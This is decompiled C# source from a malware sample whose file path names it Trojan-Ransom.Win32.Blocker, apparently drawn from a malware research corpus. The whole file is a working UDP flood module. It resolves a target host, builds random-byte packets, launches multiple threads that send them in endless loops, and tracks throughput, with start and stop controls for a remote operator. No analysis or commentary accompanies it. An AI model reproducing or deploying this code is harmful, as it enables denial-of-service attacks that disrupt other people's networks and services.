// Decompiled with JetBrains decompiler
// Type: rundll32.floods.udp
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods
{
  internal class udp
  {
    private static List<udp.FloodThreads> _floods = new List<udp.FloodThreads>();
    public static long average = 0;
    public static long SendShit = 0;
    public static long ByteLenth = 0;
    public static bool IsOn = false;
    private static string _IP;
    private static int _DEST;
    private static int _MSDEL;
    private static Thread speedThread;

    public static bool start(string host, int port, int packet, int threads, int delay)
    {
      if (udp.IsOn)
        return false;
      udp.IsOn = true;
      udp._IP = host;
      udp._DEST = port;
      udp._MSDEL = delay;
      udp.speedThread = new Thread(new ThreadStart(udp.SpeedFlooding));
      udp.speedThread.Start();
      byte[] numArray = new byte[packet];
      new Random().NextBytes(numArray);
      udp.ByteLenth = numArray.LongLength;
      IPEndPoint ep;
      try
      {
        ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
      }
      catch
      {
        ep = new IPEndPoint(IPAddress.Parse(host), port);
      }
      udp.IsOn = true;
      for (int index = 0; index < threads; ++index)
        udp._floods.Add(new udp.FloodThreads(ep, numArray));
      return true;
    }

    private static void SpeedFlooding()
    {
      Thread.Sleep(1000);
      udp.average += udp.SendShit;
      udp.SendShit = 0L;
      while (true)
      {
        Thread.Sleep(1000);
        udp.average = (udp.average + udp.SendShit) / 2L;
        udp.SendShit = 0L;
      }
    }

    public static long stop()
    {
      udp.IsOn = udp.IsOn ? false : throw new Exception("fail");
      try
      {
        udp.speedThread.Abort();
      }
      catch
      {
      }
      foreach (udp.FloodThreads flood in udp._floods)
        flood.stop();
      return udp.average;
    }

    internal class FloodThreads
    {
      private IPEndPoint _ep;
      private byte[] _packet;
      private Thread _thisThread;

      public FloodThreads(IPEndPoint ep, byte[] packet)
      {
        this._ep = ep;
        this._packet = packet;
        this._thisThread = new Thread(new ThreadStart(this._threadLoop));
        this._thisThread.Start();
      }

      public void stop()
      {
        try
        {
          this._thisThread.Abort();
          udp.speedThread.Abort();
        }
        catch
        {
        }
      }

      private void _threadLoop()
      {
        while (true)
        {
          try
          {
            new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
            {
              Blocking = false
            }.SendTo(this._packet, (EndPoint) this._ep);
            udp.SendShit += udp.ByteLenth;
            Thread.Sleep(udp._MSDEL);
          }
          catch
          {
          }
        }
      }
    }
  }
}
